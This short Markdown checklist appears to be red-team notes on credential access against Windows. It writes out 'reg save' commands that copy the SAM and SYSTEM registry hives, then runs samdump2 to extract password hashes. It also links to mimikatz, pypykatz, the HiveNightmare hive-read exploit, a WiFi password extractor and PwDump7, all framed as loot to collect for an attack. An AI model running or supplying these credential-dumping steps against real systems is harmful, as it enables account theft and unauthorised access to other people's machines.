# Credential Access

The adversary is trying to steal account names and passwords.

### Dumping Hashes

List of loots to collect
- [ ] Manually

  ```
    reg save hklm\sam C:\Users\Public\sam
    reg save hklm\system C:\Users\Public\system
  ```
  Once you have retrieved the data from SAM, you can use SamDump2 tool to dump its hashes with the following command
  
  `samdump2 system sam`
  
- [ ] Mimikats
  - binaries https://github.com/ParrotSec/mimikatz
  - project https://github.com/gentilkiwi/mimikatz
  - mimikatz cheatsheet https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
- [ ] Pypykatz
  - https://github.com/skelsec/pypykatz
- [ ] Nightmare Hive
  - Exploit allowing you to read any registry hives as non-admin.
  - https://github.com/GossiTheDog/HiveNightmare/tree/master/Release
  
 - [ ] Windows WiFi Password Extractor
  - https://github.com/hmaverickadams/Windows-WiFi-Extractor

- [ ] PwDump7
  - Only for Windows7
  - https://www.tarasco.org/security/pwdump_7/pwdump7.zip
  - 
